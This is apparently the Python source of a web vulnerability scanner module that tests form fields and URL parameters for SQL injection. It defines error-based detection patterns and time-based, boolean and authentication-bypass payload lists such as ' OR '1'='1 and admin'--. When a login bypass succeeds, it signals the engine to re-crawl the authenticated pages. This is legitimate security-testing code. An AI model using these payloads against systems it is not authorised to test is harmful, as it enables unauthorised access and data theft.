"""
SQL Injection Scanner
Detects error-based, boolean-based, time-based, and authentication-bypass SQL injection.
"""
import asyncio
import time
from typing import TYPE_CHECKING

from .base import BaseScanner, Finding

if TYPE_CHECKING:
    from wscan.engine import ScanEngine

# SQL error message patterns for various databases
SQL_ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning:.*mysql",
    r"unclosed quotation mark after the character string",
    r"mysql_fetch_array\(\)",
    r"mysql_num_rows\(\)",
    r"supplied argument is not a valid mysql",
    r"mysql server version for the right syntax",
    # PostgreSQL
    r"ERROR:\s+syntax error at or near",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"PostgreSQL.*ERROR",
    # MSSQL
    r"unclosed quotation mark",
    r"microsoft OLE DB Provider for SQL Server",
    r"microsoft SQL Native Client error",
    r"incorrect syntax near",
    r"SQLSTATE\[42000\]",
    # Oracle
    r"ORA-\d{4,5}:",
    r"Oracle error",
    r"oracle.*driver",
    # SQLite
    r"SQLite3::query\(\)",
    r"unrecognized token",
    r"SQLite.*error",
    # Generic
    r"syntax error.*sql",
    r"sql.*syntax error",
    r"database.*error",
    r"odbc.*error",
    r"db2.*error",
]

# Time-based payloads that should cause a delay
TIME_BASED_PAYLOADS = [
    "1' AND SLEEP(3)--",
    "1; WAITFOR DELAY '0:0:3'--",
    "1' AND BENCHMARK(3000000,MD5('a'))--",
    "1) AND SLEEP(3)--",
]

# Boolean-based pairs: (true_payload, false_payload)
# A significant response difference between true/false conditions indicates boolean-based SQLi.
BOOLEAN_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1) AND (1=1", "1) AND (1=2"),
]

# ── Auth bypass detection ──────────────────────────────────────────────────

# Payloads that are specifically useful for SQL injection authentication bypass.
# These are always tested against fields that look like username/password fields.
AUTH_BYPASS_PAYLOADS = frozenset([
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\"--",
    ") OR ('1'='1",
    ") OR 1=1--",
    "1 OR 1=1",
    "1 OR 1=1--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'x'='x",
    "') OR ('x'='x",
    "' OR ''='",
    "1' OR '1'='1",
])

# Field name substrings that indicate a login/authentication field.
_LOGIN_FIELD_KEYWORDS = frozenset([
    "user", "login", "email", "mail", "account", "uname",
    "pass", "pwd", "passwd", "password", "secret", "credential",
])

# Patterns in page source that suggest the login FAILED (not bypassed).
LOGIN_FAILED_PATTERNS = [
    r"invalid (user|pass|credential|login|email|account)",
    r"(user|pass|login|credential|email|account).*(incorrect|wrong|invalid|fail|bad)",
    r"authentication (fail|error|denied|invalid)",
    r"login (fail|error|incorrect|denied|invalid)",
    r"incorrect (user|pass|credential|password|login)",
    r"wrong (user|pass|credential|password|login)",
    r"(access|login|sign.?in) denied",
    r"bad (user|credential|login|password)",
    r"not (found|exist|recognized).*(user|account|email)",
    r"(user|account|email).*(not found|does not exist|unknown)",
    r"(please |try again|retry|re-enter)",
    r"error.*log(in|on)",
]

# Path segments that indicate the browser is still on an auth/error page after submit.
_AUTH_PAGE_KEYWORDS = (
    "/login", "/signin", "/sign-in", "/logon",
    "/auth", "/authenticate",
    "/error", "/403", "/401", "/access-denied",
)


class SQLiScanner(BaseScanner):
    """SQL Injection vulnerability scanner."""

    CHECK_TYPE = "sqli"
    SEVERITY = "critical"

    # ------------------------------------------------------------------
    # Auth-bypass helpers
    # ------------------------------------------------------------------

    def _is_login_field(self, field_name: str) -> bool:
        """Return True if the field name suggests a username or password input."""
        n = field_name.lower()
        return any(kw in n for kw in _LOGIN_FIELD_KEYWORDS)

    def _detect_auth_bypass(self, original_url: str, source: str) -> tuple[bool, str]:
        """
        Check whether the browser was redirected to an authenticated area after
        the payload was submitted.

        Returns (bypassed: bool, post_url: str).
        """
        try:
            post_url = self.browser.page.url
        except Exception:
            return False, ""

        # URL must differ from where the form was submitted
        if post_url.rstrip("/") == original_url.rstrip("/"):
            return False, post_url

        # Destination must not be another login / error page
        post_lower = post_url.lower()
        if any(kw in post_lower for kw in _AUTH_PAGE_KEYWORDS):
            return False, post_url

        # Response must not contain typical login-failure messages
        if self.check_response_for_patterns(source, LOGIN_FAILED_PATTERNS):
            return False, post_url

        # Minimal content check — blank pages are not a successful bypass
        if len(source.strip()) < 50:
            return False, post_url

        return True, post_url

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        """Scan a form field or URL parameter for SQL injection."""
        findings = []
        field_name = field.get("name", "unknown")
        payloads = await self.get_payloads(field_name, url)

        if self.monitor:
            await self.monitor.emit_status(
                f"SQLi testing: {field_name} on {url}"
            )

        # Get baseline response for comparison (content + timing)
        baseline_source, baseline_pair = await self._get_baseline(
            url, form_index, field_name, is_url_param
        )
        baseline_len = len(baseline_source)

        # Measure baseline response time for dynamic time-based threshold
        _b_req = baseline_pair.get("request", {})
        _b_resp = baseline_pair.get("response", {})
        _b_ts_req = _b_req.get("timestamp", 0)
        _b_ts_resp = _b_resp.get("timestamp", 0)
        baseline_time = (
            float(_b_ts_resp - _b_ts_req)
            if _b_ts_req and _b_ts_resp
            else 0.0
        )
        # Threshold = baseline + 2.5 s (the injected sleep) with 0.5 s margin
        time_threshold = max(2.5, baseline_time + 2.5)

        for payload in payloads:
            if self.monitor:
                await self.monitor.emit_payload_test(field_name, payload, "sqli")

            # Take before screenshot
            await self.browser.screenshot_b64(f"SQLi test: {field_name} = {payload[:30]}")

            # Apply payload
            source, pair = await self._apply_payload(
                url, form_index, field_name, payload, is_url_param
            )

            # --- Check 1: Error-based SQLi ---
            match = self.check_response_for_patterns(source, SQL_ERROR_PATTERNS)
            if match:
                finding = await self.record_finding(
                    url=url,
                    field_name=field_name,
                    payload=payload,
                    evidence=f"SQL error message detected: '{match}'",
                    pair=pair,
                    severity="critical",
                )
                findings.append(finding)
                break  # Found vulnerability, move to next field

            # --- Check 2: Boolean-based blind SQLi ---
            # Compare true vs false condition: if one matches the baseline and the other
            # diverges significantly, it indicates the backend evaluates the expression.
            for true_payload, false_payload in BOOLEAN_PAIRS:
                if payload not in (true_payload, false_payload):
                    continue
                partner = false_payload if payload == true_payload else true_payload
                partner_source, _ = await self._apply_payload(
                    url, form_index, field_name, partner, is_url_param
                )
                true_src = source if payload == true_payload else partner_source
                false_src = partner_source if payload == true_payload else source
                # True condition should resemble baseline; false should differ significantly.
                diff_true_base = abs(len(true_src) - baseline_len)
                diff_false_base = abs(len(false_src) - baseline_len)
                if (
                    baseline_len > 0
                    and diff_false_base > 200
                    and diff_true_base < diff_false_base * 0.5
                ):
                    finding = await self.record_finding(
                        url=url,
                        field_name=field_name,
                        payload=payload,
                        evidence=(
                            f"Boolean-based blind SQLi: true condition response length "
                            f"{len(true_src)} vs false condition {len(false_src)} "
                            f"(baseline {baseline_len})"
                        ),
                        pair=pair,
                        severity="high",
                    )
                    findings.append(finding)
                    break
            if findings:
                break

            # --- Check 3: Time-based blind SQLi ---
            if payload in TIME_BASED_PAYLOADS:
                if self.response_time_exceeded(pair, threshold=time_threshold):
                    finding = await self.record_finding(
                        url=url,
                        field_name=field_name,
                        payload=payload,
                        evidence=f"Time-based blind SQLi: response delayed (>3s)",
                        pair=pair,
                        severity="high",
                    )
                    findings.append(finding)
                    break

            # --- Check 4: Authentication bypass via SQLi ---
            # Only applicable when the field looks like a username/password input
            # and the payload is from the auth-bypass set.
            if (
                not is_url_param
                and self._is_login_field(field_name)
                and payload in AUTH_BYPASS_PAYLOADS
            ):
                bypassed, post_url = self._detect_auth_bypass(url, source)
                if bypassed:
                    finding = await self.record_finding(
                        url=url,
                        field_name=field_name,
                        payload=payload,
                        evidence=(
                            f"SQL injection authentication bypass: login form at {url!r} "
                            f"bypassed with payload {payload!r} — redirected to {post_url!r}"
                        ),
                        pair=pair,
                        severity="critical",
                    )
                    findings.append(finding)
                    # Notify the engine so it can re-crawl the authenticated surface
                    if hasattr(self.engine, "signal_auth_bypass"):
                        self.engine.signal_auth_bypass(url, payload, post_url)
                    break

            # Small delay to avoid overwhelming the server
            await asyncio.sleep(0.2 * self.sleep_factor)

        return findings

    async def _get_baseline(
        self, url: str, form_index: int, field_name: str, is_url_param: bool
    ) -> tuple[str, dict]:
        """Get a baseline response with a safe value."""
        try:
            if is_url_param:
                return await self.browser.test_url_param(url, field_name, "baseline_test")
            else:
                return await self.browser.fill_and_submit_form(
                    form_index, field_name, "baseline_test"
                )
        except Exception:
            return "", {}

    async def _apply_payload(
        self,
        url: str,
        form_index: int,
        field_name: str,
        payload: str,
        is_url_param: bool,
    ) -> tuple[str, dict]:
        """Apply a payload to the target field."""
        try:
            if is_url_param:
                return await self.browser.test_url_param(url, field_name, payload)
            else:
                # Re-navigate to the page before each test
                await self.browser.navigate(url)
                return await self.browser.fill_and_submit_form(
                    form_index, field_name, payload
                )
        except Exception:
            return "", {}
